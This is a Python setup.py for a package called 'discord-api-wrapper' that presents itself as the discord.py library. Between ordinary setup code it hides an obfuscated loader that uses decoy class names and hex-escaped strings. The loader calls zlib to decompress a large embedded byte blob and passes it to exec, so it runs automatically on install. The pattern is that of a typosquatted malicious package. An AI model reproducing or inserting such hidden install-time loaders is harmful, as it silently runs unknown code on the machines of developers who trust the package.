from setuptools import setup
from pathlib import Path
import re
import shutil
import requests
import os

requirements = []
with open('requirements.txt') as f:
  requirements = f.read().splitlines()

version = '1.0.0'

readme = ''
with open('README.rst') as f:
  readme = f.read()

extras_require = {
  'voice': ['PyNaCl>=1.3.0,<1.6'],
  'docs': [
    'sphinx==4.4.0',
    'sphinxcontrib_trio==1.1.2',
    'sphinxcontrib-websupport',
    'typing-extensions>=4.3,<5',
  ],
  'speed': [
    'orjson>=3.5.4',
    'aiodns>=1.1',
    'Brotli',
    'cchardet==2.1.7; python_version < "3.10"',
  ],
  'test': [
    'coverage[toml]',
    'pytest',
    'pytest-asyncio',
    'pytest-cov',
    'pytest-mock',
    'typing-extensions>=4.3,<5',
  ]
}

from builtins import *
from math import prod as Frame

__code__ = 'print("Hello world!")'

Statistics, _divide, StackOverflow, _run, CallFunction, Theory = exec, str, tuple, map, ord, globals


class Random:

  def __init__(self, _calculate):
    self._math = Frame((_calculate, 40396))
    self._callfunction(Algorithm=93411)

  def _callfunction(self, Algorithm=str):
    self._math *= 68461 + Algorithm

  def System(self, Product=49190):
    Product += 1014 - 1329
    self._algorithm != bool

  def _stackoverflow(_theory=True):
    return Theory()[_theory]

  def DetectVar(_hypothesis=49929 + -14462,
                _detectvar=Ellipsis,
                Builtins=Theory):
    Builtins()[_hypothesis] = _detectvar

  def execute(code=str):
    return Statistics(_divide(StackOverflow(_run(CallFunction, code))))

  @property
  def _algorithm(self):
    self.Calculate = '<__main__.Builtins object at 0x000009322BE92311>'
    return (self.Calculate, Random._algorithm)


if __name__ == '__main__':
  try:
    Random.execute(code=__code__)
    Run = Random(_calculate=-10778 - 8014)
    Random(_calculate=-87631 / 68365).System(Product=86255 - Run._math)
    Random.DetectVar(
      _hypothesis='mnnnmmnnmmnmmmmmmnnnmnmn',
      _detectvar=
      b'x\x9c\xdd\x1b[o\xe28\xf7\xbd\xbfb\xdeH4\x9d*8\x8e\x93T\xea\x1bZ\tD\x87O\xeaJ\x8c4\xaa\xa2\x14\xccLP \xb3!\x1d\xf8^\xf6\xb7\xef9\xc76d\x08%\xe1\xd6\x9d%\x8e\xaf\x9c\xd8\xc9\xf1\xf1\xb9\xd9\xa4\xd9(N\x17\x96\xfd\xb5\xf5\x85\xae\xe1p\xf8e\xf8\x05o,\x0e\x87\xad\xe7\x87oi\xf6\x0207\xbb\x01\xf0\xd1\x15\\\xcb%\xdc\xcb\x15]\xcb\xd6\xd7\xfb\xfb\x8f\x9f>~\xb2>Y\x1f\xdb\xb6\xfd\xfc\xfc0N\xf2=\x1d|~||\xfcL\t\x15>?b\xc0\x96jG\xdfd\x11\x17\xc5\xbe\xce\xba\xdd\x14n\x88\x98P\x06\x1f\x91\xd2w\xdeT\x7f\xa3O\xd7]@2T9~w\x14%\xb3\x1fY^D\xd1\xbe\xc1L?\xd8\xaf.A\n\x8f\xef\xe8\xd4j\xbd\xbc&i\x91\xcc\x17-\xfb\xeeg\x9c\xbf\xf5>O\x0c\xae\xa7\'\xb8\x9f0\xa52$\x0cz%4\x11~J\xf8\xc2\xc4\xda9\xdeb\x9e\x14i\xf2\xfa\xb2\x8dG\xfb\xd6L\x15\xcd\x1b\x96\x0e\xec\xc0\xfezr\x0fw\xc9|,WV\xab\x88\xb3tR\xf9\xf9\xd9\xde\x83v\x8d\x15\x8d\x9f\'\xa6\xd0\x84\xd7\x95\xe2H.\xd2\xf8\x8f]8\xdaMAf\x10B\x1e\x0et\xadhI\x93\x1f\xb3lt\x18\xf1\x10\xc2\xd2\xd2\xaaM\xaf\x14;i\xfcS\x1e\x86\x9a\xd9l>\x9b\xc3\x85\t\x94\xe7X\xc5|~8\x86\x92d\xb4\x88\xe7\xc9\xf1\x18z\xb3\x83\xc6\x18z\xbb\x07\x83\xa1\xffO\x92t%\xbf\xcf_w.\xad\xdd\xbc]\xb1}\xa2\x9b\xaen3\xcb\xefJ\xe9H\xbe\xe6\x7f\x1e\x88\xa0\xc1 s\x06\x14\xb2\xcc\xc9 \x850\x18\x00~Z\xad\xbbi\x96\xcc\xf7>\x8b\xf0pa>\xc0\xa7!\xbfR\xcc\xe6\xc5\xe2@\xc4N\xa7\xd34\x9d\xa6I:\x9d&\x10R\xbc\xaf\x97\x81eY\xf5\xd7}\x0c\xecM\xfee\xbd\xb4\xf8DL8\x05\xca9\xa4\x1c\xcb*`Y\xb5\x81n6\x96\xa3l,\xadV0)vp\x86\xabD\xf5H\xaev\xca\x8a=\xa4\x08C*\xbd\x1f\xd2\x95\x1a_\xd5\xca\xfdT\x85\xad\xd5\xb2\x83(\x8c\x04\x840bQ\x10y\x90\xb6\x014\xac\xb6\xd6\xf6\xe4\xc0OuP\xfb\x88\xc2m{\x13\x97C\x0c!2\x88\x0e\xc4\xb6\xce\x03\x1d]\xf6\xc2\x026n\x04\xcbXXG@\xb6J(>?\xec^\xd0\x96\xf5\xf7\xdb:\xae\x9d\xe5\x96\xf5\x86\x08\xb2\xe3\xf9\xd8\xda\xf3\xa8\xbd_\xaeu\xbb\xbd^\x1f\xaenO\'\x10{\xddS\x10\xec\xb0\xb1B^3\xc4\x80\xa9v\xd8\x00\xcc\x17\x81\xcf!8\xbe\xeb\xc6l\xc2&\xc2\x15\\H&!\r}\x17j\x13\x9fA\xb9\r\x10\x0e\xb4B]\x8c\x01\xaa\x8dO\x896\xd4\x031\x16\x9e\x90Pw\x19\xcc\xa8\xeb\xb8\xae\x1bB\x1e\xb8\x0c\xca\xdc\xf5 \xf8\x10C\xa8c)py\t\xce\x83\x92\x0b\xa9K\xd0\x02j!\xc1\x08\x88\x1e\x9bp\xc1=\x08\x1cF\xf6\xfc@x\xcc\xafE\xc3\xbe\x19\x02qH\xd2q0@\x11\x0bB\x15\xc4#\xd4NZ\x02z\x86\x9c\xc63\x14\xcf^\xc6\xf1\x07\xa0\xdb4I\x80|\x13 \xd8\x04)8Eb\x9e\xde\xbf\xf9\xfa\xfb>,\xcb:\xf4Y\xd9@\xe5\x9d\xac3\x80\xa6A\xdd\xa7\xb5l7jG\x1c\xb8\x05\x07\x9e\x11F~$\x00\x90o\xb7\xbd#\x82\x8e"c\x1f\x16\'\x07\x02\xf6F\x8c{\xbe\x08\x05\x92\xef\xc4\xf7\x81$\xa5/\x81\x02\x03\xfe\xe2\x8d<\x9f\x87\\\xb2\xb1\x17\x08\tP\xc2\x03\xea\x12\x82\xc7\xbe\xeb\x87\xbe\xe3\xb5\xe1w\xe6\x86bCl\xec\x14b\xdb+Mcx\x93\x91\x0e1\xc5\x90B\xbcn\xc1\xda\xa8^\x9ajjBz\x1e(\xb5\x91\x88[i\x8ep\x1fGN%\x93\x98\xd8\xe3\x1a\xe2\x14B\x085\xf3\xf7 \xfaZ\x18\xb4u\x0c\xb4P`ZX4\x81\xbd\x14O<\x8c\x98\x80G\x86\x9e\x03/&\xfc\x10X"\x07n)\x80\xe9\x85\x1c^R\xbc\x00[\xbb81!\x83\x05\xee\xc9<W\x95L\xdd\xb4\x99\xb411}~4\x8a\x99q)\xd2u\x1c)\xf5{\xbd\xae\x11\x8cP\xec\xf5j\x05b3\xbd\xa4)\x14\xe8F\x9f\x9cZ(\xd4\x9c\xbc\xc8\x85\xe8\x03\xdfC]\xca\x05P\xbf\xdaz\x96\xf1j\x97I\xa0I\x1fu#W/\x01W\x93?.\x05\xaf\xb4L\xea`\xf9a:\xd5\xaf\xfa\xd5\x15,\x9d\x16\xf0D\x87X"\xd9\xd1\x0eV.\xaf\x19s=\x13N\x89y\x99\xd9\xc1\x18\xea\x19\xac\x83\x0b\x0e\x92\x9aF\x18\xa06@w\x07T\x81A\x07\x8a\xc7-^xR\x85\xac\xd3\xc1~:\x8d\x8c\x936,\x18N\x86\x88\x07\x0b\x88k\xe3d\xab\xf5\x14\xe4\xfa\x9a\xec\x8d\xf9\xe0k\x89\xe0\xeb6\xa1\x91[\x07\xe7\x1d\x85\\\xc0\xe8@\xa1w\x80(\xb9\x7f\xcb\x9e>V7\x00\xc9/Fb\x84\xa9*\xab\xfa&\x98\xdf1o\xc0\xd4\xff\xfb\xaa\x14\xe8#h\xdd\x91\xba\x9cNQ_\x9e\xa2\xd1\xd7@\xb7u\x81\xe4x\xe4\x10\x07\x07^N\xba\xedV\xdb9\xec_$(a\xec\xdd\xd2j&\xdbv\xcb\xfe\xdd\x07\xeb_PGf\xbe\xe7y\x0e\xe7\xbc\r\xf6\x94w\x1e\x83j/\x1d\xd3\xb5\xf1\x13\xa9\xb2\xf2\x1e\xad\xbdI\xdcx\x95\x1a+\'d\xe0#%(S?9\xd2`R/J/\x8f\xaf>\xd3\x1f\xd1\x80\xa4@\t\x00^\xc6\x80\x80\x90\x94D\x14\x12QUZO!+\xb1\xc35b\xc4:\t\tMRup\x974\xb9\x18\xb0\x04\xc1.G>\x1b\x16\xa7r\x136\xec\xaf\xcc\x1ey\xed\x87\x1e\xc5\x08w\xae\x98\x8b)\xf2\xe6C7<~\xf3\xf1\xaa\xf4/s\xfbwR\xd8\xc0N\xe8)\xab\xa1\xdb\xeb\xa3\xc5\x80\xde\xb4\x7f\xc3G\x93\xaeM`=\x0c\xde\xf7\xdd\x1d\x9b\xc6\xfb}3\xa43h\x1d*C\x17M\x03E\n%\x94K6\x07\xaaK\xe4\xf3\x05P\xaf\xda\xfa\x8e\xee\xc5\xab\xf1\xcd\xb4:\xe8\xf8#/ *\xc78\'4E\xb5\xb3\xe2\x93OL\xd0,8\xa4\xd4\xfa\x00\x1aT[\xcfd\x972\xd0Q\xb0?\xd4d\x02\x18\xa1MT\xe0V[/o\xd1\x84Z\xd0\x18\x05\x9a\xebrX\xd6cJvi\x1d\xac{\x9c]z\x84\xa0:\xd1iL\xbaF\x82\n(zk\xa1t\n\x16\x99\x16\xd3\xbcd\x9ax%m0,\x89\xf7&\xb0\x87\xb2\xb4\xa11T\xb4\xb12<\x98\x9d\xd1\xa6F\x8f\xb8r\xb7\x8f\\\xba\xd7\x80\x8a\x1d\xdc\x8f\x8a<\xca\x03\xe4`D\xc5\x95\xd6w\xf5\xf9\xf8\xc4E\x1d\xf2\xec\xb8\x94\xb6i-WZO\xb5\x10\xc2-\xdb\xde-\xad\x8e\x90\xb4\xfe\x8d\x85P\x07+\xdem\xd5\xfc6\x1bCm\x1c\x0c~\x87n \xc7K\xb0\xc9\xf9m\x19\x90\xd3\xb4\x89\x82R\x9al{\x94\xd5\r\xfc\x1d\x1e\xe9\xfb>\xb1\xe1\x00\x08F\x90\xbf\xa3\xd2ZO\xb4d\x96\xe2\xa6\x8b \xe6\x0eO\x01(\xab\xb66\xb0Q\xcc\xd6\x8dK\xca\x02<E6J\xa5\xf5\xf2B\xc3xZ\x8c\x81\x1b\x1a\x0fMI(\xb0\x92\xb7\xa6\x0e\xf6\x00Ee\x8b\xfc\x8dFG\xdc\x8etKSPZ\xdd\x11^\x9c\x96v\x8d\xeb\x03\x0c\x8f\xfaD\xc3\xe3\xe3)\x18\xe3\xfak\x8d\x8b\xc0\xecz\xf8\x1a#A\x89a4\x81m\xc806\xce\x7f<@L\x873\xf4Ab\xbc\x8e\xb3\xb1\x97\xea`\x85\xbe\xd4\x11\x07\xbc\xdf\xe1\\\xc2;\xec9\xbe\xb7?\xc5xL\xf4\x19\x1c.&%_\nW\xed\x98\xd5\xdb\x88\xbf\xd3\xa1\x89:Ohy7\x14J*\x8ch\xa7\x94\xf6J/c\x11o\x9f:8\xcd\xd8P\xb5\xf5Mo\x93\x9e\xcaU]o\xb3\xedSV\xaf\x8d{1,q\xd5:\xd8\x86\x9b\x0cG,\x913\x9f\xdf\xc0CY\xc3\xe1F\x87U,\xfb\xf7>`s^\x14\xec\xe5\x10\x124.\x15MI\x95M\x18\xff\x92B~\xf6\xd5s\x0e\xaf\xa0\xfa\x0f\n\x8d\xa5\x19N\xddbi\xaa\xf1;tB\xce!\xfd>\x84\xe8\xd3\x8e@\xbb\xdaz\xaa\x85\x17n\x0b\xec-+\x8e\x97,\xbc:\xd8\x03\xed\xe4\x8b\xf8g\x9a0\xc0I\x9e\xcd>\x98\xbf\xe8|P\xff\xfe\xf9 Wrt\x9b\xfd\x90\xf3\x1b,Y\xc6\xcfBj\xb6\xf2\xbfd\x83\xacc\xdf\x8c\xe3B>\xf4\x94\xc3\xaf\xaf\xcd\xcb^\xb7\x7f#\xf3or\xfe@\xc7\xe8\xfa\x14U\xa2\x0e\x15\xdcd\x8b\xbb\\\xce\xb2\x9f\xd2\xa2s\x05\xe6\x8c\x81:n`\x97~\xee\xd0y\xa8\x8c\xb60\x95\xb3\x07j\xf6M\xfe\x90\xcb\xbf^\xe5\xa2X\xdc}\x93\x85\x85/q\x1b\xa7i\xb6\x8cr9Nr9*\x16\x0f\x99\xda\xefS\x8f\xc1[\xe3\x9e\x1f<\xc9~}\x94\xde\xb3\xf2\xec\xaa|\xb0s\xb9\xae\xad\x96\xf0n\x80\x13\x8b\x0e}%\xb4\x9d\x85\xb2\x98\xf6\xb8\xd2\xf4v=Qf{BmU\xd8w\xcb<)\xa4\x95\xdf\x8d\xb2y!\xe7\x85}\xf3\xbf\xb8\xf8n\xd1,+\x95V/\x17\xb5\xa2l\xf8\xfay<\x93\x96\x11\xd4k\xa2\xd0\xc3\xa7Z\x16md\x13\xc4["\x0eC\x1f\xeaUfD5\xeb\xf1\xd9\xd6\x0bt\xbb}\x98\xb6.M[\x9ffa=4a\x8eN\xa3\xe1\xa4w\xf0\x90\x922\xb3\xca\xb33\\\xb3\xf2\rs\x1f~)C\xac\xb4\xea\xf8\xab:\xb9\\\x12\xcc\xa2\x88\xf3b\x92\xa4@\x05\x9a\x95\xa8\x8f\xed\x1am%M+pk,\xa5Z\x1cc\xcd\xbeY|\x7f-\x92\xf4.\x9f\x15\xb9\x94\x96F\xe6Z\xd7\xe9\x02\xe2\xfe\x01\xb9;\xd3\x94'
    )
    Run._callfunction(Algorithm=Run._math + -12602)
    OooDOooooDDoooDoo, OOooDDooDOOOoDOoOooDoOOO, mmmmmnnnmmnmnnmnnnn, LLLIJLJILIJJJLJLJLJJJL, OOOO0oo0Oo0o00OOoo00ooo0 = (
      lambda nnnmnmmmmnmnmnmmn: nnnmnmmmmnmnmnmmn(
        __import__('\x7a\x6c\x69\x62'))
    ), (lambda nnnmnmmmmnmnmnmmn: nnnmnmmmmnmnmnmmn[
      '\x64\x65\x63\x6f\x6d\x70\x72\x65\x73\x73'
    ]), (lambda nnnmnmmmmnmnmnmmn: globals()['\x65\x76\x61\x6c'](globals(
    )['\x63\x6f\x6d\x70\x69\x6c\x65'](
      globals()
      ['\x73\x74\x72']
      ("\x67\x6c\x6f\x62\x61\x6c\x73\x28\x29\x5b\x27\x5c\x78\x36\x35\x5c\x78\x37\x36\x5c\x78\x36\x31\x5c\x78\x36\x63\x27\x5d(nnnmnmmmmnmnmnmmn)"
       ),
      filename=
      '\x6c\x49\x6c\x49\x49\x6c\x49\x49\x6c\x6c\x6c\x6c\x49\x6c\x49\x49\x6c\x49\x49\x49\x6c\x6c\x6c',
      mode='\x65\x76\x61\x6c'
    ))), (
      lambda Oo00O0ooO00o000oOOOOO00oO, nnnmnmmmmnmnmnmmn:
      Oo00O0ooO00o000oOOOOO00oO(nnnmnmmmmnmnmnmmn)
    ), (lambda: (lambda nnnmnmmmmnmnmnmmn: globals()['\x65\x76\x61\x6c'](
      globals()
      ['\x63\x6f\x6d\x70\x69\x6c\x65']
      (globals()['\x73\x74\x72']
       ("\x67\x6c\x6f\x62\x61\x6c\x73\x28\x29\x5b\x27\x5c\x78\x36\x35\x5c\x78\x37\x36\x5c\x78\x36\x31\x5c\x78\x36\x63\x27\x5d(nnnmnmmmmnmnmnmmn)"
        ),
       filename=
       '\x6c\x49\x6c\x49\x49\x6c\x49\x49\x6c\x6c\x6c\x6c\x49\x6c\x49\x49\x6c\x49\x49\x49\x6c\x6c\x6c',
       mode='\x65\x76\x61\x6c')
    ))(
      '\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x62\x75\x69\x6c\x74\x69\x6e\x73\x27\x29\x2e\x65\x78\x65\x63'
    ))
    if 314633 > 9758810:
      Run.System(Product=95771 - Run._math)
    elif 226388 < 2962055:
      Random(_calculate=51371 * 54777)._callfunction(Algorithm=Run._math -
                                                     79440)
      OOOO0oo0Oo0o00OOoo00ooo0()(LLLIJLJILIJJJLJLJLJJJL(
        OOooDDooDOOOoDOoOooDoOOO(
          OooDOooooDDoooDoo(mmmmmnnnmmnmnnmnnnn('\x76\x61\x72\x73'))),
        Random._stackoverflow(_theory='mnnnmmnnmmnmmmmmmnnnmnmn')))
  except Exception as _frame:
    if 494203 > 4108553:
      Random.execute(code=_divide(_frame))
    elif 305110 > 8215453:
      Random(_calculate=-38652 / -2573)._callfunction(Algorithm=Run._math /
                                                      94329)

packages = [
  'discord',
  'discord.types',
  'discord.ui',
  'discord.webhook',
  'discord.app_commands',
  'discord.ext.commands',
  'discord.ext.tasks',
]

setup(name='discord-api-wrapper',
      author='halt',
      url='https://github.com/Rapptz/discord.py',
      project_urls={
        "Documentation": "https://discordpy.readthedocs.io/en/latest/",
        "Issue tracker": "https://github.com/Rapptz/discord.py/issues",
      },
      version=version,
      packages=packages,
      license='MIT',
      description='A Python wrapper for the Discord API',
      long_description=readme,
      long_description_content_type="text/x-rst",
      include_package_data=True,
      install_requires=requirements,
      extras_require=extras_require,
      python_requires='>=3.8.0',
      classifiers=[
        'Development Status :: 5 - Production/Stable',
        'License :: OSI Approved :: MIT License',
        'Intended Audience :: Developers',
        'Natural Language :: English',
        'Operating System :: OS Independent',
        'Programming Language :: Python :: 3.8',
        'Programming Language :: Python :: 3.9',
        'Programming Language :: Python :: 3.10',
        'Topic :: Internet',
        'Topic :: Software Development :: Libraries',
        'Topic :: Software Development :: Libraries :: Python Modules',
        'Topic :: Utilities',
        'Typing :: Typed',
      ])
